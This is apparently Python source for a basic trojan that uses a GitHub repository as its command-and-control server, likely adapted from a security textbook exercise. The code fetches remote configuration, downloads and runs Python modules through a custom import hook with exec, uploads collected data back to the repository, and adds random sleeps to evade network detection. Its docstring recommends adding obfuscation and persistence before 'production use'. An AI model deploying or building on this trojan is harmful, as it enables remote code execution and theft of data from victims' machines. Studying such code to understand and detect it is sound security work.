'''
This is a basic Trojan written in python; this Trojan does not reach out to a conventional C2 server but instead to GitHub.
On GitHub, it will find a configuration file for itself with the format {id}.json; this configuration file will provide it with a list of modules to run on the target machine.
Each module will be run in its own thread and will report it's output back the the GHC2 in a unique file named the current time and placed in a folder named the ID of its instance.

Modules can be defined on the GHC2 in the modules directory. This Trojan can also handle manually importing dependencies when imports fail.

Compromised data may be accessed on the GHC2 in data/{ID}.

This Trojan is quite basic and should be built out with obfuscation and persistence before production use.
'''

import base64
import github3
import importlib
import json
import random
import sys
import threading
import time

from datetime import datetime

def github_connect():                   # taking the access token and returning a connection to the GitHub repository
    with open('access.txt') as f:
        token = f.read()
        token = token.strip()
    user = 'ezra-fast'
    sess = github3.login(token=token)
    return sess.repository(user, 'bhptrojan')

def get_file_contents(dirname, module_name, repo):      # taking the directory name, module name, and repository connection and returns the contents of the specified module
    return repo.file_contents(f"{dirname}/{module_name}").content   # this function is responsible for grabbing files from the repo and reading them locally

'''
Trojan:
    - get_config, module_runner, and store_module_result are used to push any collected data from the local machine to the remote repository
        - These exfiltrations are made via HTTPS and are therefore protected with TLS
'''

class Trojan:
    def __init__(self, id):
        self.id = id
        self.config_file = f"{id}.json"     # this instances configuration file
        self.data_path = f"data/{id}/"      # remote path where the trojan will write its output files
        self.repo = github_connect()        # making the connection to the repository

    def get_config(self):                   # this method retrieves the remote configuration document from the repo so that the trojan knows which modules to run
        config_json = get_file_contents('config', self.config_file, self.repo)
        config = json.loads(base64.b64decode(config_json))

        for task in config:
            if task['module'] not in sys.modules:
                exec("import %s" % task['module'])      # this call brings the module content into the trojan object
        return config

    def module_runner(self, module):
        result = sys.modules[module].run()              # running the module that was just imported with the run() function defined in the module
        self.store_module_result(result)                # store the result with store_module_result, which creates the file and pushes it through the connection

    def store_module_result(self, data):                # creating a file with the current date and time and writing module output to that file
        message = datetime.now().isoformat()
        remote_path = f"data/{self.id}/{message}.data"
        bindata = bytes('%r' % data, 'utf-8')
        self.repo.create_file(remote_path, message, base64.b64encode(bindata))

    def run(self):
        while True:
            config = self.get_config()              # grabbing the configuration file from the remote repository
            for task in config:                     # for each module
                thread = threading.Thread(target=self.module_runner, args=(task['module'],))        # start the module in its own thread with module_runner
                thread.start()
                time.sleep(random.randint(1, 10))       # sleep to foil network pattern detection

            time.sleep(random.randint(30*60, 3*60*60))  # sleep to foil network pattern detection --> instead of sleeping, seemingly normal traffic could also be generated 

class GitImporter:          # when the interpreter tries to import a module that isn't available, this class will be used.
    def __init__(self):
        self.current_module_code = ""

    def find_module(self, name, path=None):             # attempting to locate the module
        print(f"[*] Attempting to retrieve {name}")
        self.repo = github_connect()                    # connecting to the remote repository
        new_library = get_file_contents('modules', f'{name}.py', self.repo)     # getting the file contents of the desired import
        if new_library is not None:                     # if we have located the import in our remote repository
            self.current_module_code = base64.b64decode(new_library)        # decode the code and store it in the current object
            return self                                                     # return the object to the interpreter now that it contains the required code
        
    def load_module(self, name):                # the interpreter calls this object once find_module returns
        spec = importlib.util.spec_from_loader(name, loader=None, origin=self.repo.git_url)
        new_module = importlib.util.module_from_spec(spec)          # create a blank new module object 
        exec(self.current_module_code, new_module.__dict__)         # put the retrieved code into the new blank module object
        sys.modules[spec.name] = new_module                         # add the new module to the sys.modules list so that future import calls may use it
        return new_module

if __name__ == "__main__":
    sys.meta_path.append(GitImporter())         # adding GitImporter() to the sys.meta_path list (so that it's a viable alternative when import fails)
    trojan = Trojan('abc')                      # instantiate a trojan object
    trojan.run()                                # run() the trojan
